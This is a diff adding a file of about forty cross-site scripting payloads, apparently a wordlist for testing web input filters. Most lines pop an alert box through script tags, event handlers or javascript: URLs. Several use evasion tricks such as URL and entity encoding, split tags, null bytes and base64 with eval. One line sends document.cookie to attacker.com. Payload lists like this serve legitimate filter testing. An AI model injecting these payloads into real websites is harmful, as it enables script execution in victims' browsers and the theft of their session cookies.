@@ -1,0 +1,44 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+javascript:alert(1)
+<a href="javascript:alert(1)">click</a>
+<form action="javascript:alert(1)"><input type=submit>
+<isindex action=javascript:alert(1) type=image>
+<isindex src=1 onerror=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<image src=1 onerror=alert(1)>
+<marquee onstart=alert(1)>
+</script><script>alert(1)</script>
+--><script>alert(1)</script>
+\"><script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<script/src=data:,alert(1)></script>
+<script>window['alert'](1)</script>
+<script>self[`al`+`ert`](1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>fetch('//attacker.com/?c='+document.cookie)</script>
+<svg><script>alert(1)</script></svg>
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text y=15>click</text></a></svg>
+<math><a xlink:href="javascript:alert(1)">click</a></math>
+<table background="javascript:alert(1)"></table>
+<div style="background-image:url(javascript:alert(1))">
+<div style="behavior:url(#default#time2)" onbegin="alert(1)">
+<link rel=stylesheet href="javascript:alert(1)">
